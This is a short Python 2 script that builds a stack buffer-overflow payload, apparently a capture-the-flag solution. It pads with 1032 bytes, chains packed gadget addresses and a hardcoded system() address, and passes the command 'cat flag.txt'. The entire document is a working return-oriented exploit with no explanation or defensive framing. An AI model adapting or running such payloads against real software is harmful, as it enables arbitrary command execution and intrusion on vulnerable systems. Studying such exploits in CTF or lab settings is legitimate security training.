import struct


sys_add =0x7ffff7a53380

payload = 1032*'A' + struct.pack("<Q",0x4006d1) + struct.pack("<Q",0x10) + struct.pack("<Q",0x4006d3) + "cat flag.txt"+ "A"*4 + struct.pack("<Q",0x4006d0) +struct.pack("<Q",sys_add)
print payload

